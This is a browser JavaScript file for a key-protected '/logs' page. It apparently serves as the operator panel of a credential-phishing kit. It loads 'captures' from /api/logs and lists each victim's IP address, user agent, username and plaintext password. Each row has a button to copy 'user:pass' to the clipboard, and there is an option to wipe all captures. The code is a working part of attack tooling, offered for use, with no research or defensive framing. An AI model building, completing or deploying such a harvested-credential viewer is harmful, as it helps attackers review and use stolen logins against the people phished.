// lang: JS, file: public/logs.js, target: browser (viewer for /logs)
// Hard-wired to the elements in logs.html. Load button fires fetch to /api/logs.
// Every failure path writes visible text into #status AND #body.

(function () {
  'use strict';

  const PAGE_SIZE = 25;

  function $(id) { return document.getElementById(id); }

  function boot() {
    const el = {
      key:     $('keyInput'),
      load:    $('loadBtn'),
      refresh: $('refreshBtn'),
      clear:   $('clearBtn'),
      status:  $('status'),
      body:    $('body'),
    };

    // If any element is missing, shout into the page — silent failure is the bug.
    const missing = Object.keys(el).filter(k => !el[k]);
    if (missing.length) {
      document.body.insertAdjacentHTML('afterbegin',
        '<div style="background:#3d1f1f;color:#f85149;padding:12px;font-family:monospace">' +
        'logs.js: missing element(s): ' + missing.join(', ') + '</div>');
      return;
    }

    const state = { key: '', page: 0, total: 0 };

    function setStatus(s) { el.status.textContent = s; }

    function escapeHtml(s) {
      return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
      }[c]));
    }

    function renderEmpty(msg) { el.body.className = 'empty'; el.body.textContent = msg || 'no captures yet'; }
    function renderError(msg) { el.body.className = 'error'; el.body.textContent = msg; }

    function renderTable(rows) {
      if (!rows.length) { renderEmpty(); return; }
      const trs = rows.map(r => (
        '<tr>' +
          '<td class="time">' + escapeHtml(r.ts) + '</td>' +
          '<td class="ip">' + escapeHtml(r.ip) + '</td>' +
          '<td><span class="ua" title="' + escapeHtml(r.ua) + '">' + escapeHtml(r.ua) + '</span></td>' +
          '<td>' + escapeHtml(r.user) + '</td>' +
          '<td class="pass">' + escapeHtml(r.pass) + '</td>' +
          '<td><button class="copy" data-copy="' + escapeHtml((r.user || '') + ':' + (r.pass || '')) + '">copy</button></td>' +
        '</tr>'
      )).join('');

      el.body.className = '';
      el.body.innerHTML =
        '<table>' +
          '<thead><tr><th>time</th><th>ip</th><th>ua</th><th>user</th><th>pass</th><th></th></tr></thead>' +
          '<tbody>' + trs + '</tbody>' +
        '</table>' +
        '<div class="pager">' +
          '<button id="prev" ' + (state.page === 0 ? 'disabled' : '') + '>prev</button>' +
          '<span>page ' + (state.page + 1) + '</span>' +
          '<button id="next" ' + ((state.page + 1) * PAGE_SIZE >= state.total ? 'disabled' : '') + '>next</button>' +
        '</div>';

      const prev = $('prev'), next = $('next');
      if (prev) prev.addEventListener('click', function () { load(state.page - 1); });
      if (next) next.addEventListener('click', function () { load(state.page + 1); });

      el.body.querySelectorAll('.copy').forEach(function (b) {
        b.addEventListener('click', function () {
          const v = b.getAttribute('data-copy') || '';
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(v).then(function () {
              b.textContent = 'ok'; setTimeout(function () { b.textContent = 'copy'; }, 900);
            }).catch(function () {
              b.textContent = 'x'; setTimeout(function () { b.textContent = 'copy'; }, 900);
            });
          } else {
            b.textContent = 'x';
            setTimeout(function () { b.textContent = 'copy'; }, 900);
          }
        });
      });
    }

    async function load(page) {
      if (page == null) page = 0;
      if (!state.key) { setStatus('no key'); renderError('enter a view key first'); return; }
      setStatus('loading…');
      try {
        const url = '/api/logs?k=' + encodeURIComponent(state.key) +
                    '&page=' + page + '&limit=' + PAGE_SIZE;
        const r = await fetch(url, { cache: 'no-store' });
        if (r.status === 404) { setStatus('bad key'); renderError('bad key — check VIEW_KEY'); return; }
        if (r.status >= 500) {
          let body = '';
          try { body = await r.text(); } catch (_) {}
          setStatus('api error ' + r.status);
          renderError('api error ' + r.status + (body ? ('\n' + body) : ''));
          return;
        }
        if (!r.ok) { setStatus('http ' + r.status); renderError('http ' + r.status); return; }
        const data = await r.json();
        state.page  = data.page || 0;
        state.total = data.total || 0;
        renderTable(data.entries || []);
        setStatus(state.total + ' capture' + (state.total === 1 ? '' : 's'));
      } catch (e) {
        setStatus('fetch failed');
        renderError('fetch failed: ' + (e && e.message ? e.message : e));
      }
    }

    // --- wire buttons ---

    el.load.addEventListener('click', function (ev) {
      ev.preventDefault();
      const k = el.key.value.trim();
      if (!k) { setStatus('no key'); renderError('enter a view key first'); return; }
      state.key = k;
      load(0);
    });

    el.key.addEventListener('keydown', function (ev) {
      if (ev.key === 'Enter') { ev.preventDefault(); el.load.click(); }
    });

    el.refresh.addEventListener('click', function (ev) {
      ev.preventDefault();
      if (state.key) load(state.page);
      else setStatus('no key');
    });

    el.clear.addEventListener('click', function (ev) {
      ev.preventDefault();
      if (!state.key) { setStatus('no key'); return; }
      if (!confirm('delete ALL captures? this cannot be undone.')) return;
      setStatus('clearing…');
      fetch('/api/logs?k=' + encodeURIComponent(state.key), { method: 'DELETE' })
        .then(function (r) {
          if (!r.ok) { setStatus('clear failed ' + r.status); return; }
          setStatus('cleared');
          load(0);
        })
        .catch(function () { setStatus('clear failed'); });
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();
